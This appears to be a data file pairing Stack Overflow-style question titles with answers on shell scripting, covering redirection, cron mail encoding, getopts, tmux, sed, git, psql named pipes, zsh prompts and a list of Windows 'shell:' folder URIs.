    "what does 1>/dev/null 2>&1 & pid1=$! mean?": "Redirect standard output (file handle 1) to /dev/null\n1>/dev/null\nRedirect standard error (file handle 2) to standard output\n2>&1\nAssign the PID of the most recent background command to variable pid1 (more in bash man page, special parameters)\npid1=$!\nThe result is that both standard output and standard error are redirected to /dev/null\nMore examples can be found here: http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO-3.html\nNormally three files are opened to a program: standard input, standard output and standard error. You can read more about standard streams or redirection at wikipedia.\nThe following part of the script:\n./script1.sh param1 1>/dev/null 2>&1 &\npid1=$!\nTranslated to plain English:\nFrom current directory ./ run a program script1.sh with parameter param1 and redirect standard output to /dev/null 1>/dev/null and redirect standard error to standard output 2>&1and let the program run in the background &. Assign the PID of the program that was just started in the background to pid1 pid1=$!.",
    "Use crontab job send mail, The email text turns to an attached file which named ATT00001.bin": "Ran into the same problem myself, only I'm piping text output into mailx - Heirloom mailx 12.4 7/29/08\nWhen running the script on the command line the email came out as normal email with a text body.\nHowever, when I ran the exact same script via crontab the body of the email came as an attachment - ATT00001.BIN (Outlook), application/octet-stream (mutt) or \"noname\" (Gmail).\nTook some research to figure this out, but here goes:\nProblem\nMailx will, if it encounters unknown / control characters in text input, convert it into an attachment with application/octet-stream mime-type set.\nFrom the man page:\nfor any file that contains formatting characters other than newlines and horizontal tabulators\nSo you need to remove those control characters, which can be done with i.e. tr\necho \"$Output\" | /usr/bin/tr -cd '\\11\\12\\15\\40-\\176' | mail ...\nHowever since I had Norwegian UTF8 characters: \u00e6\u00f8\u00e5 - the list expand, and you don't really want to maintain such a list, and I need the norwegian characters.\nAnd inspecting the attachment I found I had only \\r, \\n the \"regular\" ASCII characters in range 32-176 - all printable and 184 and 195 --> UTF8\nSollution\nExplicitly set the locale in your script:\nLANG=\"en_US.UTF8\" ; export LANG\nRun export in your shell - or setenv if you run csh or tcsh to determine what your locale is set to.\nExplanation\nMailx - when run in your shell - with LANG set to .UTF8, will correctly identify the UTF8 chars and continue.\nWhen run in crontab LANG is not set, and default to LANG=C, since by default crontab will run only a restricted set of environment variables (system dependant).\nmailx (or other programs) will then not recognize UTF8 characters and determine that the input containes unknown control characters.\nMy issue was UTF8 characters, yours could be other control characters in your input. Run it through hexdump or od -c, but since it works OK in a regular shell I'm suspecting LANG issues.\nReferences:\nlinux mail < file.log has Content-Type: application/octet-stream (a noname attachment in Gmail)\nhttp://alvinalexander.com/blog/post/linux-unix/how-remove-non-printable-ascii-characters-file-unix",
    "Bash function argument returns error \"command not found\"": "It may be the space in TITLE= \"$1\" that causes the error. Try with TITLE=\"$1\"",
    "Grep Recursive and Count": "Using Bash's process substitution, this gives what I believe is the output you want? (Please clarify the question if it's not.)\ngrep -r \"string here\" * | tee >(wc -l)\nThis runs grep -r normally, with output going both to stdout and to a wc -l process.",
    "trying to capture javac output in bash shell": "javac file.java 2> log.txt\nThe reason is that you have two output file descriptors instead of one. The usual one is stdout, which you can redirect with > and it's supposed to be used for resulting output. The second one, stderr, is meant for human readable output like warnings, errors, current status etc., this one is redirected with 2>.\nYour second line, using 2>&1, redirects stderr to stdout and finally stdout into log.txt.",
    "Auto configure Jupyter password from command line": "1. Generate hash with passwd function\nGenerate hash for your_password manually in console:\nIn [1]: from notebook.auth import passwd; passwd()\nEnter password: *************\nVerify password: *************\nOut[1]: 'sha1:a58051cdbd5c:8ee35109f0076445b37be17d926e56bee5910bea'\nor in script:\n$ python3 -c \"from notebook.auth import passwd; print(passwd('your_password'))\"\nsha1:a58051cdbd5c:8ee35109f0076445b37be17d926e56bee5910bea\n2. Run jupyter with NotebookApp.password param\nWhen started:\njupyter notebook --NotebookApp.password='sha1:a58051cdbd5c:8ee35109f0076445b37be17d926e56bee5910bea'\nor via jupyter config, e.g. in Dockerfile as in this answer:\nRUN jupyter notebook --generate-config\nRUN echo \"c.NotebookApp.password='sha1:a58051cdbd5c:8ee35109f0076445b37be17d926e56bee5910bea'\">>/root/.jupyter/jupyter_notebook_config.py",
    "sed can't match 0 or 1 time": "Captured group (()) and the quantifier ? (match the preceding token 0 or 1 time) comes (at least) with ERE (Extended RegEx), not BRE (Basic RegEx).\nsed by default uses BRE, so the tokens are being treated literally.\nTo enable ERE, use -E (or -r if available) with sed:\nsed -E '/\\.jp(e)?g/!d' myfile\nCapturing e is redundant here:\nsed -E '/\\.jpe?g/!d' myfile\nNote that, you can use ERE tokens from BRE by escaping them with \\, so the following would work too:\nsed '/\\.jp\\(e\\)\\?g/!d' myfile\nsed '/\\.jpe\\?g/!d' myfile\nAgain, this does not look as clean as just using one option i.e. -E. Only case where you will want this is portability.",
    "set environment variables by file using python": "There's a great python library python-dotenv that allows you to have your variables exported to your environment from a .env file, or any file you want, which you can keep out of source control (i.e. add to .gitignore):\n# to install\npip install -U python-dotenv\n# your .env file\nexport MY_VAR_A=super-secret-value\nexport MY_VAR_B=other-very-secret-value\n...\nAnd you just load it in python when your start like:\n# settings.py\nfrom dotenv import load_dotenv\nload_dotenv()\nThen, you can access any variable later in your code:\nfrom os import environ\n\nmy_value_a = environ.get('MY_VALUE_A')\nprint(my_value_a) # 'super-secret-value'",
    "Pass list of arguments to a command in shell": "If your list is in your argument vector -- that is to say, if you were started with:\n./yourscript file1 file2 ...\nthen you'd run\nmycommand \"$@\"\nIf your list is in an array:\nmycommand \"${my_list_of_files[@]}\"\nIf your list is in a NUL-delimited file:\nxargs -0 -- mycommand <file_with_argument_list\nIf your list is in a newline-delimited file (which you should never do for filenames, since filenames can legitimately contain newlines):\nreadarray -t filenames <file_with_argument_list\nmycommand \"${filenames[@]}\"\nIf by \"list\", you just mean that you have a sequence of files:\nmycommand file{1..20}\n...or, to build an array of filenames with numeric components from a range more explicitly in cases where {1..20} doesn't work (such as when 20 is a variable):\nmax=20 # to demonstrate something you can't do with brace expansion\nlist=( )\nfor ((i=0; i<max; i++)); do\n  list+=( file\"$i\" )\ndone\nmycommand \"${list[@]}\"",
    "Starting for Loop from second element - Shell script": "You can use ${number[@]:1} to start iterating from 2nd element:\nfor i in \"${number[@]:1}\"; do\n    echo \"Processing: $i\"\ndone",
    "tmux copy does not work": "tmux has an option, mode-keys, you can find it in man page.\ndefault is emacs, but if your $EDITOR is vim/vi, tmux will use vi.\nSo the key binding will be in vi mode.\nE.g. your Alt-w won't work, it is emacs binding. you can see a table of key-binds in tmux man page.\nsome related to your question:\nFunction                     vi              emacs\nCopy selection               Enter           M-w\nStart selection              Space           C-Space\nso you should go with the vi-mode keys.\nI used vim mode too, and did a little customization (to make it same as vim) in my tmux.conf, maybe you could give it a try:\nbind-key -t vi-copy 'v' begin-selection     # Begin selection in copy mode.\nbind-key -t vi-copy 'C-v' rectangle-toggle  # Begin selection in copy mode.\nbind-key -t vi-copy 'y' copy-selection      # Yank selection in copy mode.",
    "Bash if string = this or that [duplicate]": "Use this syntax in bash :\nif [ \"a string\" = \"another one\" ] ; then\n\n# Whatever\n\nfi\nFor multiple conditional statements such as OR, use:\nif [ \"a string\" = \"another one\" ] || [ \"$foo\" = \"bar\" ] ; then\n\n# Whatever\n\nfi\nbash also supports the non-standard [[ ... ]] expression, which can process a compound comparison using a single command, rather than 2 [ commands:\nif [[ \"a string\" = \"another one\" || $foo = \"bar\" ]]; then\n\n# Whatever\n\nfi",
    "Parsing for data in HTML using XPath (in a shell script)": "Quick and dirty solution...\nxmllint --html -xpath \"//table/tbody/tr[6]/td[2]\" page.html\nYou can find the xpath of your node using Chrome and the Developer Tools. When inspecting the node, right click on it and select copy XPath.\nI wouldn't use this too much, this is not very reliable.\nAll the information on your page can be found elsewhere: run whois on your own IP for instance...",
    "Using wkhtmltopdf on Windows": "",
    "How to set iterm2 tab title to that of a running tmux session name?": "add these to your ~/.tmux.conf:\nset-option -g set-titles on\nset-option -g set-titles-string \"#{session_name} - #{host}\"",
    "echo smbpasswd by --stdin doesn't work": "You need to repeat the password, \"for confirmation\" so to speak, so e.g.\nprintf \"passwd\\npasswd\\n\" | smbpasswd -a -s $user\nshould work.",
    "How to pipe commands in rust?": "What you need is the documentation, where they do explain everything line by line, with thorough examples. Adapted from it, here is your code\nuse std::process::{Command, Stdio};\nuse std::str;\n\nfn main() {\n    let ps_child = Command::new(\"ps\") // `ps` command...\n        .arg(\"axww\")                  // with argument `axww`...\n        .stdout(Stdio::piped())       // of which we will pipe the output.\n        .spawn()                      // Once configured, we actually spawn the command...\n        .unwrap();                    // and assert everything went right.\n    let grep_child_one = Command::new(\"grep\")\n        .arg(\"mongod\")\n        .stdin(Stdio::from(ps_child.stdout.unwrap())) // Pipe through.\n        .stdout(Stdio::piped())\n        .spawn()\n        .unwrap();\n    let grep_child_two = Command::new(\"grep\")\n        .arg(\"-v\")\n        .arg(\"grep\")\n        .stdin(Stdio::from(grep_child_one.stdout.unwrap()))\n        .stdout(Stdio::piped())\n        .spawn()\n        .unwrap();\n    let output = grep_child_two.wait_with_output().unwrap();\n    let result = str::from_utf8(&output.stdout).unwrap();\n    println!(\"{}\", result);\n}\nSee the playground (which of course won't output anything since there is no process called mongod running...).",
    "bash - nested EOF": "Just use a different delimiter on the outer cat, \"EOF\" isn't special in any way to the shell:\ncat - << REALEND > file1.sh\necho first\ncat - << EOF > file2.sh\necho second\nEOF\necho again first\nREALEND\nResults in this content in file1.sh\necho first\ncat - << EOF > file2.sh\necho second\nEOF\necho again first",
    "How to change prompt in iTerm2 in Mac OS?": "Since the update to version 10.15 Catalina, macOS includes Z shell (zsh) as default instead of Bash in the Terminal app, therefore when you install iterm2, it will use any Zsh settings stored on the Zsh profile(dotfile).\nHere are the steps to follow; paste the command, save and quit. Reopen iterm2 to view the changes.\nBy default in MacOS, the dotfile is not there so you'll have to create one.\nCreate the Zsh profile(dot file), I use nano editor but you can use any other of your choice\nnano ~/.zshrc\nThe default Zsh prompt carries information like the username, machine name, and location starting in the user's home directory, so you can customize what to output on prompt:\nTo view only your username\nPROMPT=\"%n:~$ \"\nTo view only the working directory:\nPROMPT=\"%1d:~$ \"\nTo view only Time ( %T - 24hrs, %t - 12hrs or %* 24hrs+seconds )\nPROMPT=\"%T:~$ \"\nTo view only Date ( %D: yy-mm-dd format or %W: mm-dd-yy format )\nPROMPT=\"%W:~$ \"\nTo view only the $ symbol\nPROMPT=\"~$ \"\nTo view your Username and Date\nPROMPT=\"%n:%W:~$ \"\nTo view your Username and Time\nPROMPT=\"%n:%T:~$ \"\nYou can even add coloring to the relevant text. Ensure to enclose in the %F & %f color variables.\nCyan color\nPROMPT=\"%F{cyan}%T%f:~$ \"\nLastly, this is my choice, To view Time and working directory\nPROMPT=\"%F{cyan}%T@%1d%f:~$ \"",
    "\"cannot execute binary file\" when trying to run a shell script on linux": "chmod -x removes execution permission from a file. Do this:\nchmod +x path/to/mynewshell.sh\nAnd run it with\n/path/to/mynewshell.sh\nAs the error report says, you script is not actually a script, it's a binary file.",
    "How to use git show with pretty or format that come up with just commit message brief?": "git show --format=\"YOUR_FORMAT\" -s\n-s suppresses the diffs from showing.\nYOUR_FORMAT is documented at:\nman git-log\nsection PRETTY FORMATS\nFor example, to get just commit SHAs and author email for a few SHAs:\ngit show --format=\"%H %ae\" -s 62f6870e4e0b384c4bd2d514116247e81b241251 96ee0246ce52012644dd18cf360e64c49016fb7f\ngives output for format:\n62f6870e4e0b384c4bd2d514116247e81b241251 author@mail.com\n96ee0246ce52012644dd18cf360e64c49016fb7f author@mail.com\nTo add newlines and more fields to the format, you could do:\ngit show --format=$'%H\\n%ae\\n%an\\n' -s 62f6870e4e0b384c4bd2d514116247e81b241251 96ee0246ce52012644dd18cf360e64c49016fb7f\nWhich gives output for form:\n62f6870e4e0b384c4bd2d514116247e81b241251\nauthor@mail.com\nCiro Santilli\n\n96ee0246ce52012644dd18cf360e64c49016fb7f\nauthor@mail.com\nCiro Santilli",
    "Duplicate stdin to stdout": "Solution 1:\n<command_which_produces_output> | { a=\"$(</dev/stdin)\";  echo \"$a\"; echo \"$a\"; }\nIn this way, you're saving the content from the standard input in a (choose a better name please), and then echo'ing twice.\nNotice $(</dev/stdin) is a similar but more efficient way to do $(cat /dev/stdin).\nSolution 2:\nUse tee in the following way:\n<command_which_produces_output> | tee >(echo \"$(</dev/stdin)\")\nHere, you're firstly writing to the standard output (that's what tee does), and also writing to a FIFO file created by process substitution:\n>(echo \"$(</dev/stdin)\")\nSee for example the file it creates in my system:\n$ echo >(echo \"$(</dev/stdin)\")\n/dev/fd/63\nNow, the echo \"$(</dev/stdin)\" part is just the way I found to firstly read the entire file before printing it. It echo'es the content read from the process substitution's standard input, but once all the input is read (not like cat that prints line by line).",
    "What's the most elegant way to add Redis to /etc/services?": "A single line sort that puts it in the right place:\necho -e \"redis\\t\\t6379/tcp\" | sort -k2 -n -o /etc/services -m - /etc/services",
    "Git clone with password @": "I think what you are looking is to escape the special character @, which you can use encode %40 instead of @. This link might help Escape @ character in git proxy password",
    "Empty $OPTARG with getopts \"b:\" and ''./script -b foo''": "You're missing a colon after b (not needed before b).\nUse this script:\n#!/bin/bash\n\nwhile getopts \"b:\" opt; do\n  case $opt in\n    b)  \n        echo \"result is: $OPTARG\";;\n    *) \n        echo \"Invalid option: -$OPTARG\" >&2;;  \n  esac\ndone",
    "Build a string in Bash with newlines": "Using ANSI C quoting:\nvar=\"$var\"$'\\n'\"in a box\"\nYou could put the $'\\n' in a variable:\nnewline=$'\\n'\nvar=\"$var${newline}in a box\"\nBy the way, in this case, it's better to use the concatenation operator:\nvar+=\"${newline}in a box\"\nIf you don't like ANSI C quoting, you can use printf with its -v option:\nprintf -v var '%s\\n%s' \"$var\" \"in a box\"\nThen, to print the content of the variable var, don't forget quotes!\necho \"$var\"\nor, better yet,\nprintf '%s\\n' \"$var\"\nRemark. Don't use upper case variable names in Bash. It's terrible, and one day it will clash with an already existing variable!\nYou could also make a function to append a newline and a string to a variable using indirect expansion (have a look in the Shell Parameter Expansion section of the manual) as so:\nappend_with_newline() { printf -v \"$1\" '%s\\n%s' \"${!1}\" \"$2\"; }\nThen:\n$ var=\"The \"\n$ var+=\"cat wears a mask\"\n$ append_with_newline var \"in a box\"\n$ printf '%s\\n' \"$var\"\nThe cat wears a mask\nin a box\n$ # There's no cheating. Look at the content of 'var':\n$ declare -p var\ndeclare -- var=\"The cat wears a mask\nin a box\"\nJust for fun, here's a generalized version of the append_with_newline function that takes n+1 arguments (n\u22651) and that will concatenate them all (with exception of the first one being the name of a variable that will be expanded) using a newline as separator, and puts the answer in the variable, the name of which is given in the first argument:\nconcatenate_with_newlines() { local IFS=$'\\n'; printf -v \"$1\" '%s\\n%s' \"${!1}\" \"${*:2}\"; }\nLook how well it works:\n$ var=\"hello\"\n$ concatenate_with_newlines var \"a gorilla\" \"a banana\" \"and foobar\"\n$ printf '%s\\n' \"$var\"\nhello\na gorilla\na banana\nand foobar\n$ # :)\nIt's a funny trickery with IFS and \"$*\".",
    "How to get Android system boot time": "",
    "Insert SQL statements via command line without reopening connection to remote database": "Answer to your actual question\nYes. You can use a named pipe instead of creating a file. Consider the following demo.\nCreate a schema x in my database event for testing:\n-- DROP SCHEMA x CASCADE;\nCREATE SCHEMA x;\nCREATE TABLE x.x (id int, a text);\nCreate a named pipe (fifo) from the shell like this:\npostgres@db:~$ mkfifo --mode=0666 /tmp/myPipe\nEither 1) call the SQL command COPY using a named pipe on the server:\npostgres@db:~$ psql event -p5433 -c \"COPY x.x FROM '/tmp/myPipe'\"\nThis will acquire an exclusive lock on the table x.x in the database. The connection stays open until the fifo gets data. Be careful not to leave this open for too long! You can call this after you have filled the pipe to minimize blocking time. You can chose the sequence of events. The command executes as soon as two processes bind to the pipe. The first waits for the second.\nOr 2) you can execute SQL from the pipe on the client:\npostgres@db:~$ psql event -p5433 -f /tmp/myPipe\nThis is better suited for your case. Also, no table locks until SQL is executed in one piece.\nBash will appear blocked. It is waiting for input to the pipe. To do it all from one bash instance, you can send the waiting process to the background instead. Like this:\npostgres@db:~$ psql event -p5433 -f /tmp/myPipe 2>&1 &\nEither way, from the same bash or a different instance, you can fill the pipe now.\nDemo with three rows for variant 1):\npostgres@db:~$ echo '1  foo' >> /tmp/myPipe; echo '2    bar' >> /tmp/myPipe; echo '3    baz' >> /tmp/myPipe;\n(Take care to use tabs as delimiters or instruct COPY to accept a different delimiter using WITH DELIMITER 'delimiter_character')\nThat will trigger the pending psql with the COPY command to execute and return:\nCOPY 3\nDemo for for variant 2):\npostgres@db:~$ (echo -n \"INSERT INTO x.x VALUES (1,'foo')\" >> /tmp/myPipe; echo -n \",(2,'bar')\" >> /tmp/myPipe; echo \",(3,'baz')\" >> /tmp/myPipe;)\n\nINSERT 0 3\nDelete the named pipe after you are done:\npostgres@db:~$ rm /tmp/myPipe\nCheck success:\nevent=# select * from x.x;\n id |         a\n----+-------------------\n  1 | foo\n  2 | bar\n  3 | baz\nUseful links for the code above\nReading compressed files with postgres using named pipes\nIntroduction to Named Pipes\nBest practice to run bash script in background\nAdvice you may or may not not need\nFor bulk INSERT you have better solutions than a separate INSERT per row. Use this syntax variant:\nINSERT INTO mytable (col1, col2, col3) VALUES\n (1, 'foo', 'bar')\n,(2, 'goo', 'gar')\n,(3, 'hoo', 'har')\n...\n;\nWrite your statements to a file and do one mass INSERT like this:\npsql -h remote_server -U username -d database -p 5432 -f my_insert_file.sql\n(5432 or whatever port the db-cluster is listening on)\nmy_insert_file.sql can hold multiple SQL statements. In fact, it's common practise to restore / deploy whole databases like that. Consult the manual about the -f parameter, or in bash: man psql.\nOr, if you can transfer the (compressed) file to the server, you can use COPY to insert the (decompressed) data even faster.\nYou can also do some or all of the processing inside PostgreSQL. For that you can COPY TO (or INSERT INTO) a temporary table and use plain SQL statements to prepare and finally INSERT / UPDATE your tables. I do that a lot. Be aware that temporary tables live and die with the session.\nYou could use a GUI like pgAdmin for comfortable handling. A session in an SQL Editor window remains open until you close the window. (Therefore, temporary tables live until you close the window.)",
    "Where can I learn about the \"shell:\" URI?": "There doesn't seem to be a MSDN reference: there is this, though: http://www.winhelponline.com/blog/shell-commands-to-access-the-special-folders/\nEdit: The KNOWNFOLDERID page on MSDN has some details on the folders, but not on the shell: mechanism for opening them.\nEdit 2: This is the contents of the first link, just in case it disappears:\nThe shell: command can be used to open a special folder directly from the Start, Search menu or from the Run dialog. For example, the command shell:sendto opens the SendTo folder (%userprofile%\\sendto) of your user profile. To launch the Documents folder of your user profile, you\u2019d type shell:Personal. Below is a complete shell: commands listing for Windows 10/8/7/XP/Vista. The entire listing is stored in the following registry key in Windows Vista and higher:\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\explorer\\FolderDescriptions\nComplete list of Shell: commands in Windows 10\nThere are 22 new shell commands for Windows 10. The \"SkyDrive\u2026\" stuff becomes \"OneDrive\u2026\", and the earlier format is dropped in Windows 10. The new additions to Windows 10 are highlighted thereby.\nshell:AccountPictures\nshell:Roaming Tiles\nshell:Common Programs\nshell:PublicAccountPictures\nshell:GameTasks\nshell:UserProfiles\nshell:MyComputerFolder\nshell:SearchHistoryFolder\nshell:Local Pictures\nshell:SyncSetupFolder\nshell:DpapiKeys\nshell:Retail Demo\nshell:Favorites\nshell:My Video\nshell:SearchHomeFolder\nshell:RecordedTVLibrary\nshell:System\nshell:Libraries\nshell:ThisDeviceFolder\nshell:AppsFolder\nshell:MusicLibrary\nshell:CommonVideo\nshell:OneDriveDocuments\nshell:SyncResultsFolder\nshell:Cookies\nshell:CameraRollLibrary\nshell:Original Images\nshell:Recorded Calls\nshell:3D Objects\nshell:CommonMusic\nshell:OneDrivePictures\nshell:My Pictures\nshell:Cache\nshell:Local Videos\nshell:Downloads\nshell:SavedPictures\nshell:CommonDownloads\nshell:AppData\nshell:SyncCenterFolder\nshell:PublicLibraries\nshell:VideosLibrary\nshell:My Music\nshell:ConflictFolder\nshell:SavedGames\nshell:InternetFolder\nshell:HomeGroupFolder\nshell:Quick Launch\nshell:SystemCertificates\nshell:Contacts\nshell:UserProgramFiles\nshell:Device Metadata Store\nshell:Profile\nshell:Start Menu\nshell:Common AppData\nshell:ProgramFilesCommonX64\nshell:PhotoAlbums\nshell:ProgramFilesX64\nshell:ConnectionsFolder\nshell:Administrative Tools\nshell:ThisPCDesktopFolder\nshell:OneDriveCameraRoll\nshell:PrintersFolder\nshell:DocumentsLibrary\nshell:ProgramFilesX86\nshell:Searches\nshell:Local Downloads\nshell:SearchTemplatesFolder\nshell:Common Startup\nshell:ControlPanelFolder\nshell:SendTo\nshell:ResourceDir\nshell:ProgramFiles\nshell:CredentialManager\nshell:PrintHood\nshell:MAPIFolder\nshell:HomeGroupCurrentUserFolder\nshell:User Pinned\nshell:CD Burning\nshell:Local Music\nshell:UsersLibrariesFolder\nshell:AppUpdatesFolder\nshell:Application Shortcuts\nshell:Common Start Menu\nshell:Common Start Menu Places\nshell:LocalAppDataLow\nshell:OneDrive\nshell:Templates\nshell:Programs\nshell:PicturesLibrary\nshell:Roamed Tile Images\nshell:Camera Roll\nshell:Recent\nshell:Desktop\nshell:Virtual Machines\nshell:CommonPictures\nshell:RecycleBinFolder\nshell:Screenshots\nshell:CryptoKeys\nshell:Common Templates\nshell:Startup\nshell:ImplicitAppShortcuts\nshell:UserProgramFilesCommon\nshell:Links\nshell:OEM Links\nshell:OneDriveMusic\nshell:Common Desktop\nshell:NetHood\nshell:Ringtones\nshell:Games\nshell:Common Administrative Tools\nshell:NetworkPlacesFolder\nshell:SystemX86\nshell:History\nshell:Development Files\nshell:AddNewProgramsFolder\nshell:Playlists\nshell:ProgramFilesCommonX86\nshell:PublicGameTasks\nshell:ChangeRemoveProgramsFolder\nshell:Public\nshell:SavedPicturesLibrary\nshell:CommonRingtones\nshell:Common Documents\nshell:Captures\nshell:CSCFolder\nshell:Local AppData\nshell:StartMenuAllPrograms\nshell:Windows\nshell:UsersFilesFolder\nshell:Local Documents\nshell:ProgramFilesCommon\nshell:Fonts\nshell:Personal\nComplete list of Shell: commands in Windows 8\nshell:AccountPictures\nshell:Roaming Tiles\nshell:Common Programs\nshell:PublicAccountPictures\nshell:GameTasks\nshell:UserProfiles\nshell:MyComputerFolder\nshell:SearchHistoryFolder\nshell:SyncSetupFolder\nshell:DpapiKeys\nshell:Favorites\nshell:My Video\nshell:SearchHomeFolder\nshell:RecordedTVLibrary\nshell:System\nshell:Libraries\nshell:ThisDeviceFolder\nshell:AppsFolder\nshell:MusicLibrary\nshell:CommonVideo\nshell:SkyDriveDocuments\nshell:SyncResultsFolder\nshell:Cookies\nshell:Original Images\nshell:CommonMusic\nshell:SkyDrivePictures\nshell:My Pictures\nshell:Cache\nshell:Downloads\nshell:CommonDownloads\nshell:AppData\nshell:SyncCenterFolder\nshell:PublicLibraries\nshell:VideosLibrary\nshell:My Music\nshell:ConflictFolder\nshell:SavedGames\nshell:InternetFolder\nshell:HomeGroupFolder\nshell:Quick Launch\nshell:SystemCertificates\nshell:Contacts\nshell:UserProgramFiles\nshell:Device Metadata Store\nshell:Profile\nshell:Start Menu\nshell:Common AppData\nshell:PhotoAlbums\nshell:ConnectionsFolder\nshell:Administrative Tools\nshell:ThisPCDesktopFolder\nshell:SkyDriveCameraRoll\nshell:PrintersFolder\nshell:DocumentsLibrary\nshell:ProgramFilesX86\nshell:Searches\nshell:SearchTemplatesFolder\nshell:Common Startup\nshell:ControlPanelFolder\nshell:SendTo\nshell:ResourceDir\nshell:ProgramFiles\nshell:CredentialManager\nshell:PrintHood\nshell:MAPIFolder\nshell:HomeGroupCurrentUserFolder\nshell:User Pinned\nshell:CD Burning\nshell:UsersLibrariesFolder\nshell:AppUpdatesFolder\nshell:Application Shortcuts\nshell:Common Start Menu\nshell:LocalAppDataLow\nshell:OneDrive\nshell:Templates\nshell:Programs\nshell:PicturesLibrary\nshell:Roamed Tile Images\nshell:Camera Roll\nshell:Recent\nshell:Desktop\nshell:CommonPictures\nshell:RecycleBinFolder\nshell:Screenshots\nshell:CryptoKeys\nshell:Common Templates\nshell:Startup\nshell:ImplicitAppShortcuts\nshell:UserProgramFilesCommon\nshell:Links\nshell:OEM Links\nshell:SkyDriveMusic\nshell:Common Desktop\nshell:NetHood\nshell:Ringtones\nshell:Games\nshell:Common Administrative Tools\nshell:NetworkPlacesFolder\nshell:SystemX86\nshell:History\nshell:AddNewProgramsFolder\nshell:Playlists\nshell:ProgramFilesCommonX86\nshell:PublicGameTasks\nshell:ChangeRemoveProgramsFolder\nshell:Public\nshell:CommonRingtones\nshell:Common Documents\nshell:CSCFolder\nshell:Local AppData\nshell:StartMenuAllPrograms\nshell:Windows\nshell:UsersFilesFolder\nshell:ProgramFilesCommon\nshell:Fonts\nshell:Personal\nNew Shell: commands in Windows 7\nIn addition to most of the shell commands in Windows Vista, Windows 7 also has these new commands in addition:\nshell:Libraries\nshell:MusicLibrary\nshell:VideosLibrary\nshell:OtherUsersFolder\nshell:Device Metadata Store\nshell:PublicSuggestedLocations\nshell:SuggestedLocations\nshell:RecordedTVLibrary\nshell:UserProgramFiles\nshell:DocumentsLibrary\nshell:User Pinned\nshell:UsersLibrariesFolder\nshell:PicturesLibrary\nshell:ImplicitAppShortcuts\nshell:UserProgramFilesCommon\nshell:Ringtones\nshell:CommonRingtones\nshell: commands in Windows Vista\nshell:Common Programs\nshell:GameTasks\nshell:UserProfiles\nshell:MyComputerFolder\nshell:SyncSetupFolder\nshell:DpapiKeys\nshell:SamplePlaylists\nshell:Favorites\nshell:My Video\nshell:SearchHomeFolder\nshell:System\nshell:CommonVideo\nshell:SyncResultsFolder\nshell:LocalizedResourcesDir\nshell:Cookies\nshell:Original Images\nshell:CommonMusic\nshell:My Pictures\nshell:Cache\nshell:Downloads\nshell:CommonDownloads\nshell:AppData\nshell:SyncCenterFolder\nshell:My Music\nshell:ConflictFolder\nshell:SavedGames\nshell:InternetFolder\nshell:Quick Launch\nshell:SystemCertificates\nshell:Contacts\nshell:TreePropertiesFolder\nshell:Profile\nshell:Start Menu\nshell:Common AppData\nshell:PhotoAlbums\nshell:ConnectionsFolder\nshell:Administrative Tools\nshell:PrintersFolder\nshell:Default Gadgets\nshell:ProgramFilesX86\nshell:Searches\nshell:Common Startup\nshell:ControlPanelFolder\nshell:SampleVideos\nshell:SendTo\nshell:ResourceDir\nshell:ProgramFiles\nshell:CredentialManager\nshell:PrintHood\nshell:MAPIFolder\nshell:CD Burning\nshell:AppUpdatesFolder\nshell:Common Start Menu\nshell:LocalAppDataLow\nshell:Templates\nshell:Gadgets\nshell:Programs\nshell:Recent\nshell:SampleMusic\nshell:Desktop\nshell:CommonPictures\nshell:RecycleBinFolder\nshell:CryptoKeys\nshell:Common Templates\nshell:Startup\nshell:Links\nshell:OEM Links\nshell:SamplePictures\nshell:Common Desktop\nshell:NetHood\nshell:Games\nshell:Common Administrative Tools\nshell:NetworkPlacesFolder\nshell:SystemX86\nshell:History\nshell:AddNewProgramsFolder\nshell:Playlists\nshell:ProgramFilesCommonX86\nshell:PublicGameTasks\nshell:ChangeRemoveProgramsFolder\nshell:Public\nshell:Common Documents\nshell:CSCFolder\nshell:Local AppData\nshell:Windows\nshell:UsersFilesFolder\nshell:ProgramFilesCommon\nshell:Fonts\nshell:Personal\nshell: commands in Windows XP\nshell:Common Programs\nshell:Favorites\nshell:My Video\nshell:System\nshell:CommonVideo\nshell:LocalizedResourcesDir\nshell:Cookies\nshell:My Pictures\nshell:Cache\nshell:AppData\nshell:My Music\nshell:InternetFolder\nshell:Profile\nshell:Start Menu\nshell:Common AppData\nshell:ConnectionsFolder\nshell:Administrative Tools\nshell:PrintersFolder\nshell:ProgramFiles\nshell:Common Startup\nshell:ControlPanelFolder\nshell:SendTo\nshell:ResourceDir\nshell:ProgramFiles\nshell:PrintHood\nshell:CD Burning\nshell:Common Start Menu\nshell:Templates\nshell:Programs\nshell:Recent\nshell:Desktop\nshell:CommonPictures\nshell:RecycleBinFolder\nshell:Common Templates\nshell:Startup\nshell:Common Desktop\nshell:NetHood\nshell:Common Administrative Tools\nshell:SystemX86\nshell:History\nshell:Common Documents\nshell:Local AppData\nshell:Windows\nshell:Fonts\nshell:Personal",
    "Exclude specific filename from shell globbing": "if you are using bash\n#!/bin/bash\nshopt -s extglob\nls !(fubar).log\nor without extglob\nshopt -u extglob\nfor file in !(fubar).log\ndo\n  echo \"$file\"\ndone\nor\nfor file in *log\ndo\n   case \"$file\" in\n     fubar* ) continue;;\n     * ) echo \"do your stuff with $file\";;\n   esac \ndone",
    "Bourne Shell For i in (seq)": "try\nfor i in 1 10 15 20\ndo\n   echo \"do something with $i\"\ndone\nelse if you have recent Solaris, there is bash 3 at least. for example this give range from 1 to 10 and 15 to 20\nfor i in {1..10} {15..20}\ndo\n  echo \"$i\"\ndone\nOR use tool like nawk\nfor i in `nawk 'BEGIN{ for(i=1;i<=10;i++) print i}'`\ndo\n  echo $i\ndone\nOR even the while loop\nwhile [ \"$s\" -lt 10 ]; do s=`echo $s+1|bc`; echo $s; done",
    "Shell Script + Write to File a String": "This worked for me\n$ FOO=\"192.168.1.1\"\n$ echo \"serverurl=http://$FOO:8000\" >> x.conf\n$ more x.conf\nserverurl=http://192.168.1.1:8000\nI'm using zsh. I verified it with bash as well. What's the problem you get when you do this?",
